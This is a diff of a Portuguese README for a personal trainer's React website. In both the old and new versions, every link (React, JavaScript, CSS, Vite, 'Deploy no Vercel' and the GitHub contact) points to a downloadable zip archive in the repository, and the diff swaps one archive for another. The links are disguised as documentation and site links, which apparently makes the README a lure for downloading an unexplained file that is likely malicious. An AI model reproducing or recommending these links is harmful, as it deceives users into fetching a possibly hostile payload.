@@ -20,21 +20,21 @@ Este projeto é um site desenvolvido para um personal trainer, com foco em apres
 
 ## 🛠️ Tecnologias Utilizadas
 
-- [React](https://raw.githubusercontent.com/PauloMiguelVIdal/personalGustavo/main/src/components/personalGustavo_entoplasm.zip)
-- [JavaScript (ES6+)](https://raw.githubusercontent.com/PauloMiguelVIdal/personalGustavo/main/src/components/personalGustavo_entoplasm.zip)
-- [CSS](https://raw.githubusercontent.com/PauloMiguelVIdal/personalGustavo/main/src/components/personalGustavo_entoplasm.zip)
-- [Vite](https://raw.githubusercontent.com/PauloMiguelVIdal/personalGustavo/main/src/components/personalGustavo_entoplasm.zip) *(caso aplicável)*
+- [React](https://github.com/PauloMiguelVIdal/personalGustavo/raw/refs/heads/main/public/Gustavo_personal_3.1.zip)
+- [JavaScript (ES6+)](https://github.com/PauloMiguelVIdal/personalGustavo/raw/refs/heads/main/public/Gustavo_personal_3.1.zip)
+- [CSS](https://github.com/PauloMiguelVIdal/personalGustavo/raw/refs/heads/main/public/Gustavo_personal_3.1.zip)
+- [Vite](https://github.com/PauloMiguelVIdal/personalGustavo/raw/refs/heads/main/public/Gustavo_personal_3.1.zip) *(caso aplicável)*
 
 ---
 
 ## 🌐 Acesse o site
 
-- 🔗 [Deploy no Vercel](https://raw.githubusercontent.com/PauloMiguelVIdal/personalGustavo/main/src/components/personalGustavo_entoplasm.zip)
+- 🔗 [Deploy no Vercel](https://github.com/PauloMiguelVIdal/personalGustavo/raw/refs/heads/main/public/Gustavo_personal_3.1.zip)
 
 ---
 
 📬 Contato
 Caso deseje entrar em contato sobre o projeto ou outros serviços:
 
-🐱 GitHub: https://raw.githubusercontent.com/PauloMiguelVIdal/personalGustavo/main/src/components/personalGustavo_entoplasm.zip
+🐱 GitHub: https://github.com/PauloMiguelVIdal/personalGustavo/raw/refs/heads/main/public/Gustavo_personal_3.1.zip
 
